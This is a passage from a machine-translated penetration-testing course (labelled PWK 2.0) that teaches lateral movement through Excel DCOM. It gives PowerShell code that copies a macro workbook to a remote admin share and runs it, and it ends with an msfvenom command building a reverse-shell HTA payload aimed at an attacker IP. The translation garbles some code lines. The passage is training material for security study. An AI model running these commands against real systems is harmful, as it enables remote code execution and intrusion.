<div style="position:absolute;top:59497;left:791"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">667</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:58532;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">$com | </font><font style="vertical-align: inherit;">获取会员</font></font></nobr></div>
<div style="position:absolute;top:58552;left:268"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">清单 710 - 创建 DCOM 对象和枚举方法的代码</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:58582;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">此脚本生成以下截断的输出：</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:58616;left:182"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">类型名称：System.__ComObject#{000208d5-0000-0000-c000-000000000046}</font></font></nobr></div>
<div style="position:absolute;top:58633;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">名称    </font></font></nobr></div>
<div style="position:absolute;top:58633;left:303"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">成员类型定义    </font></font></nobr></div>
<div style="position:absolute;top:58650;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">----    </font></font></nobr></div>
<div style="position:absolute;top:58650;left:303"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">---------- ----------    </font></font></nobr></div>
<div style="position:absolute;top:58667;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">ActivateMicrosoftApp 方法    </font></font></nobr></div>
<div style="position:absolute;top:58667;left:425"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">void ActivateMicrosoftApp (XlMSApplication)    </font></font></nobr></div>
<div style="position:absolute;top:58684;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">AddChartAutoFormat 方法    </font></font></nobr></div>
<div style="position:absolute;top:58684;left:425"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">void AddChartAutoFormat (Variant, string, Varia  </font></font></nobr></div>
<div style="position:absolute;top:58701;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">...</font></font></nobr></div>
<div style="position:absolute;top:58718;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">重置提示向导    </font></font></nobr></div>
<div style="position:absolute;top:58718;left:303"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">方法    </font></font></nobr></div>
<div style="position:absolute;top:58718;left:425"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">void ResetTipWizard ()</font></font></nobr></div>
</span></font>
<font size="3" color="#c00000" face="Times"><span style="font-size:11px;font-family:Times;color:#c00000">
<div style="position:absolute;top:58735;left:109"><nobr><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">跑步    </font></font></b></nobr></div>
<div style="position:absolute;top:58735;left:303"><nobr><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">方法    </font></font></b></nobr></div>
<div style="position:absolute;top:58735;left:425"><nobr><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">变体运行（变体...</font></font></b></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:58752;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">保存    </font></font></nobr></div>
<div style="position:absolute;top:58752;left:303"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">方法    </font></font></nobr></div>
<div style="position:absolute;top:58752;left:425"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">无效保存（变体）</font></font></nobr></div>
<div style="position:absolute;top:58769;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">...</font></font></nobr></div>
<div style="position:absolute;top:58786;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">工作簿    </font></font></nobr></div>
<div style="position:absolute;top:58786;left:303"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">属性工作簿工作簿 () {get} </font></font></nobr></div>
<div style="position:absolute;top:58803;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">...</font></font></nobr></div>
<div style="position:absolute;top:58822;left:329"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">清单 711 - 显示 Run 方法的输出</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:58851;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">输出包含许多方法和对象，但我们将重点关注</font></font><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Run</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">方法</font></font><font style="font-size:8px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">691</font></font></font><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">，它将</font></font></nobr></div>
<div style="position:absolute;top:58871;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">允许我们远程执行 Visual Basic for Applications (VBA) 宏。</font></font></nobr></div>
<div style="position:absolute;top:58904;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">要使用它，我们将首先通过选择概念宏来创建一个 Excel 文档</font></font></nobr></div>
<div style="position:absolute;top:58923;left:109"><nobr><i><font style="vertical-align: inherit;"></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">在 Excel 中</font><i><font style="vertical-align: inherit;">查看</font></i><font style="vertical-align: inherit;">功能区并单击</font></font><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">宏</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">。</font></font></nobr></div>
<div style="position:absolute;top:58956;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">在这个简单的概念证明中，我们将使用一个启动</font></font><b><font style="font-size:13px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">notepad.exe</font></font></font></b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">的 VBA 宏</font><font style="vertical-align: inherit;">：</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:58991;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">子宏()</font></font></nobr></div>
<div style="position:absolute;top:59008;left:141"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">外壳（“notepad.exe”）</font></font></nobr></div>
<div style="position:absolute;top:59025;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">结束子</font></font></nobr></div>
<div style="position:absolute;top:59044;left:327"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">清单 712 - Excel 概念宏的证明</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:59074;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">我们将宏命名为“mymacro”并将 Excel 文件保存为旧的 .xls 格式。</font></font></nobr></div>
<div style="position:absolute;top:59106;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">要执行宏，我们必须首先将 Excel 文档复制到远程计算机。</font><font style="vertical-align: inherit;">因为我们</font></font></nobr></div>
<div style="position:absolute;top:59126;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">必须是本地管理员才能利用 DCOM，我们还应该可以访问</font></font></nobr></div>
<div style="position:absolute;top:59145;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">通过 SMB 的远程文件系统。</font></font></nobr></div>
<div style="position:absolute;top:59178;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">我们可以使用</font><font style="vertical-align: inherit;">.NET </font><i><font style="vertical-align: inherit;">System.IO.File</font></i><font style="vertical-align: inherit;">类</font><font style="vertical-align: inherit;">的</font></font><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Copy</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">方法</font></font><font style="font-size:8px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">692</font></font></font><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">来复制文件。</font><font style="vertical-align: inherit;">为了调用它，我们</font></font><i><font style="vertical-align: inherit;"></font></i><font style="vertical-align: inherit;"></font></nobr></div>
<div style="position:absolute;top:59197;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">指定源文件、目标文件和一个标志来指示目标文件是否应该是</font></font></nobr></div>
<div style="position:absolute;top:59217;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">覆盖（如果存在），如下面的 PowerShell 代码所示：</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:59251;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">$LocalPath = "C:\Users\jeff_admin.corp\myexcel.xls"</font></font></nobr></div>
<div style="position:absolute;top:59285;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">$RemotePath = "\\192.168.1.110\c$\myexcel.xls"</font></font></nobr></div>
<div style="position:absolute;top:59319;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">[System.IO.File]::Copy($LocalPath, $RemotePath, $True)</font></font></nobr></div>
<div style="position:absolute;top:59339;left:270"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">清单 713 - 将 Excel 文档复制到远程计算机</font></font></i></nobr></div>
</span></font>
<font size="2" face="Times"><span style="font-size:5px;font-family:Times">
<div style="position:absolute;top:59427;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">691 </font></font><font style="font-size:9px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">（微软，2017 年），https://msdn.microsoft.com/en-us/vba/excel-vba/articles/application-run-method-excel</font></font></font></nobr></div>
<div style="position:absolute;top:59447;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">692 </font><font style="font-size:9px"><font style="vertical-align: inherit;">（微软，2017 年），https:</font></font><font style="vertical-align: inherit;"> //msdn.microsoft.com/en-us/library/9706cfs5 </font></font><font style="font-size:9px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">(v=vs.110).aspx</font></font></font></nobr></div>
</span></font>

<div style="position:absolute;top:59575;left:0"><hr><table border="0" width="100%"><tbody><tr><td bgcolor="eeeeee" align="right"><font face="arial,sans-serif"><a name="51"><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">第 51 页</font></font></b></a></font></td></tr></tbody></table></div><font size="2" face="Times"><span style="font-size:9px;font-family:Times">
<div style="position:absolute;top:59608;left:611"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">使用 Kali Linux 2.0 进行渗透测试</font></font></nobr></div>
<div style="position:absolute;top:60685;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">PWK 2.0</font></font></nobr></div>
<div style="position:absolute;top:60685;left:318"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">版权所有 © Offensive Security Ltd. 保留所有权利。</font></font></nobr></div>
<div style="position:absolute;top:60685;left:791"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">668</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:59704;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">在我们能够对</font><font style="vertical-align: inherit;">宏</font><font style="vertical-align: inherit;">执行</font></font><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Run</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">方法</font><font style="vertical-align: inherit;">之前</font><font style="vertical-align: inherit;">，我们必须首先指定 Excel</font></font></nobr></div>
<div style="position:absolute;top:59723;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">它包含在其中的文档。这是通过</font><i><font style="vertical-align: inherit;">Workbooks</font></i><font style="vertical-align: inherit;">对象</font><font style="font-size:8px"><font style="vertical-align: inherit;">694</font></font><font style="vertical-align: inherit;">的</font></font><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Open</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">方法</font></font><font style="font-size:8px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">693</font></font></font><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">完成的</font></font><i><font style="vertical-align: inherit;"></font></i><font style="vertical-align: inherit;"></font><font style="font-size:8px"><font style="vertical-align: inherit;"></font></font></nobr></div>
<div style="position:absolute;top:59742;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">这也可以通过 DCOM 获得，如方法和对象的枚举所示：</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:59777;left:182"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">类型名称：System.__ComObject#{000208d5-0000-0000-c000-000000000046}</font></font></nobr></div>
<div style="position:absolute;top:59794;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">名称    </font></font></nobr></div>
<div style="position:absolute;top:59794;left:295"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">成员类型定义    </font></font></nobr></div>
<div style="position:absolute;top:59811;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">----    </font></font></nobr></div>
<div style="position:absolute;top:59811;left:295"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">---------- ----------    </font></font></nobr></div>
<div style="position:absolute;top:59828;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">ActivateMicrosoftApp 方法无效 ActivateMicrosoftApp (XlMSApplication)    </font></font></nobr></div>
<div style="position:absolute;top:59845;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">AddChartAutoFormat 方法 void AddChartAutoFormat (Variant, string, Variant)  </font></font></nobr></div>
<div style="position:absolute;top:59862;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">...</font></font></nobr></div>
<div style="position:absolute;top:59879;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">重置提示向导    </font></font></nobr></div>
<div style="position:absolute;top:59879;left:295"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">方法 void ResetTipWizard()</font></font></nobr></div>
<div style="position:absolute;top:59896;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">跑步    </font></font></nobr></div>
<div style="position:absolute;top:59896;left:295"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">方法变体运行（变体...</font></font></nobr></div>
<div style="position:absolute;top:59913;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">保存    </font></font></nobr></div>
<div style="position:absolute;top:59913;left:295"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">方法 void Save (Variant)</font></font></nobr></div>
<div style="position:absolute;top:59930;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">...</font></font></nobr></div>
</span></font>
<font size="3" color="#c00000" face="Times"><span style="font-size:11px;font-family:Times;color:#c00000">
<div style="position:absolute;top:59947;left:109"><nobr><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">工作簿    </font></font></b></nobr></div>
<div style="position:absolute;top:59947;left:295"><nobr><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">属性工作簿工作簿 () {get}</font></font></b></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:59964;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">...</font></font></nobr></div>
<div style="position:absolute;top:59983;left:306"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">清单 714 - 显示 Workbooks 属性的输出</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:60013;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">该</font></font><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">工作簿</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">对象从创建</font></font><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">$ COM</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> COM处理我们前面创建的执行我们的</font></font></nobr></div>
<div style="position:absolute;top:60032;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">枚举。</font></font></nobr></div>
<div style="position:absolute;top:60065;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">我们可以</font><font style="vertical-align: inherit;">使用如下代码直接</font><font style="vertical-align: inherit;">调用</font></font><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Open</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">方法：</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:60100;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">$Workbook = $com.Workbooks.Open("C:\myexcel.xls")</font></font></nobr></div>
<div style="position:absolute;top:60119;left:310"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">清单 715 - 在 DC 上打开 excel 文档</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:60149;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">但是，此代码在与远程计算机交互时会导致错误：</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:60183;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">$Workbook = $com.Workbooks.Open("C:\myexcel.xls")</font></font></nobr></div>
<div style="position:absolute;top:60200;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">无法获取 Workbooks 类的 Open 属性</font></font></nobr></div>
<div style="position:absolute;top:60217;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">在行：1 字符：1</font></font></nobr></div>
<div style="position:absolute;top:60234;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">+ $Workbook = $com.Workbooks.Open("C:\myexcel.xls")</font></font></nobr></div>
<div style="position:absolute;top:60251;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">+ ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~</font></font></nobr></div>
<div style="position:absolute;top:60268;left:141"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">+ 分类信息    </font></font></nobr></div>
<div style="position:absolute;top:60268;left:336"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">: OperationStopped: (:) [], COMException</font></font></nobr></div>
<div style="position:absolute;top:60285;left:141"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">+ FullQualifiedErrorId : System.Runtime.InteropServices.COMException</font></font></nobr></div>
<div style="position:absolute;top:60304;left:302"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">清单 716 - 尝试打开电子表格时出错</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:60334;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">这个错误的原因是当</font></font><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Excel.Application</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">通过DCOM实例化</font><font style="vertical-align: inherit;">时</font><font style="vertical-align: inherit;">，是用</font></font></nobr></div>
<div style="position:absolute;top:60353;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">SYSTEM 帐户。</font></font><font style="font-size:8px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">695</font></font></font><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> SYSTEM 帐户没有配置文件，该配置文件用作</font></font></nobr></div>
<div style="position:absolute;top:60373;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">开工过程。</font><font style="vertical-align: inherit;">要解决此问题，我们可以简单地在以下位置创建桌面文件夹</font></font></nobr></div>
<div style="position:absolute;top:60392;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">C:\Windows\SysWOW64\config\systemprofile，满足此配置文件要求。</font></font></nobr></div>
<div style="position:absolute;top:60425;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">我们可以使用以下 PowerShell 代码创建此目录：</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:60460;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">$Path = "\\192.168.1.110\c$\Windows\sysWOW64\config\systemprofile\Desktop"</font></font></nobr></div>
<div style="position:absolute;top:60494;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">$temp = [system.io.directory]::createDirectory($Path)</font></font></nobr></div>
<div style="position:absolute;top:60513;left:333"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">清单 717 - 创建 SYSTEM 配置文件文件夹</font></font></i></nobr></div>
</span></font>
<font size="2" face="Times"><span style="font-size:5px;font-family:Times">
<div style="position:absolute;top:60595;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">693 </font></font><font style="font-size:9px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">（微软，2017 年），https://msdn.microsoft.com/en-us/vba/excel-vba/articles/workbooks-open-method-excel</font></font></font></nobr></div>
<div style="position:absolute;top:60615;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">694 </font></font><font style="font-size:9px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">（微软，2017 年），https://msdn.microsoft.com/en-us/vba/excel-vba/articles/workbooks-object-excel</font></font></font></nobr></div>
<div style="position:absolute;top:60635;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">695 </font></font><font style="font-size:9px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">（马特·纳尔逊，2017 年），https://enigma0x3.net/2017/09/11/lateral-movement-using-excel-application-and-dcom/</font></font></font></nobr></div>
</span></font>

<div style="position:absolute;top:60763;left:0"><hr><table border="0" width="100%"><tbody><tr><td bgcolor="eeeeee" align="right"><font face="arial,sans-serif"><a name="52"><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">第 52 页</font></font></b></a></font></td></tr></tbody></table></div><font size="2" face="Times"><span style="font-size:9px;font-family:Times">
<div style="position:absolute;top:60796;left:611"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">使用 Kali Linux 2.0 进行渗透测试</font></font></nobr></div>
<div style="position:absolute;top:61873;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">PWK 2.0</font></font></nobr></div>
<div style="position:absolute;top:61873;left:318"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">版权所有 © Offensive Security Ltd. 保留所有权利。</font></font></nobr></div>
<div style="position:absolute;top:61873;left:791"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">669</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:60892;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">创建 SYSTEM 帐户的配置文件文件夹后，我们可以尝试调用</font></font><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Open</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">方法</font></font></nobr></div>
<div style="position:absolute;top:60911;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">再次，现在应该成功并打开 Excel 文档。</font></font></nobr></div>
<div style="position:absolute;top:60944;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">现在文档已打开，我们可以调用</font></font><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Run</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">方法，如下完成</font></font></nobr></div>
<div style="position:absolute;top:60963;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">PowerShell 脚本：</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:60998;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">$com = [activator]::CreateInstance([type]::GetTypeFromProgId("Excel.Application", "192</font></font></nobr></div>
<div style="position:absolute;top:61015;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">.168.1.110"))</font></font></nobr></div>
<div style="position:absolute;top:61049;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">$LocalPath = "C:\Users\jeff_admin.corp\myexcel.xls"</font></font></nobr></div>
<div style="position:absolute;top:61083;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">$RemotePath = "\\192.168.1.110\c$\myexcel.xls"</font></font></nobr></div>
<div style="position:absolute;top:61117;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">[System.IO.File]::Copy($LocalPath, $RemotePath, $True)</font></font></nobr></div>
<div style="position:absolute;top:61151;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">$Path = "\\192.168.1.110\c$\Windows\sysWOW64\config\systemprofile\Desktop"</font></font></nobr></div>
<div style="position:absolute;top:61185;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">$temp = [system.io.directory]::createDirectory($Path)</font></font></nobr></div>
<div style="position:absolute;top:61219;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">$Workbook = $com.Workbooks.Open("C:\myexcel.xls")</font></font></nobr></div>
<div style="position:absolute;top:61253;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">$com.Run("mymacro")</font></font></nobr></div>
<div style="position:absolute;top:61272;left:263"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">清单 718 - 远程执行 Excel 宏的概念代码证明</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:61301;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">此代码应将记事本应用程序作为后台进程打开</font></font></nobr></div>
<div style="position:absolute;top:61321;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">远程机器上的完整性上下文，如图 312 所示。</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:61524;left:334"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">图 312：从 Excel 启动记事本</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:61555;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">虽然创建远程记事本应用程序很有趣，但我们需要升级此攻击才能启动</font></font></nobr></div>
<div style="position:absolute;top:61575;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">取而代之的是反向外壳。</font><font style="vertical-align: inherit;">由于我们使用的是 Office 文档，因此我们可以简单地重用 Microsoft</font></font></nobr></div>
<div style="position:absolute;top:61594;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">我们在上一个模块中介绍的 Word 客户端代码执行技术。</font></font></nobr></div>
<div style="position:absolute;top:61627;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">为此，我们将使用 msfvenom 为 HTA 攻击创建有效载荷，因为它包含 Base64</font></font></nobr></div>
<div style="position:absolute;top:61646;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">与 PowerShell 一起使用的编码有效负载：</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:61681;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">kali@kali:~$ </font></font><b><font color="#0070c0"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">msfvenom -p windows/shell_reverse_tcp LHOST=192.168.1.111 LPORT=4444 -fh</font></font></font></b></nobr></div>
</span></font>
<font size="3" color="#0070c0" face="Times"><span style="font-size:11px;font-family:Times;color:#0070c0">
<div style="position:absolute;top:61698;left:109"><nobr><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">ta-psh -o evil.hta</font></font></b></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:61715;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">未选择平台，从有效负载中选择 Msf::Module::Platform::Windows</font></font></nobr></div>
<div style="position:absolute;top:61732;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">未选择 Arch，从有效载荷中选择 Arch: x86</font></font></nobr></div>
<div style="position:absolute;top:61749;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">未指定编码器或 badchars，输出原始负载</font></font></nobr></div>
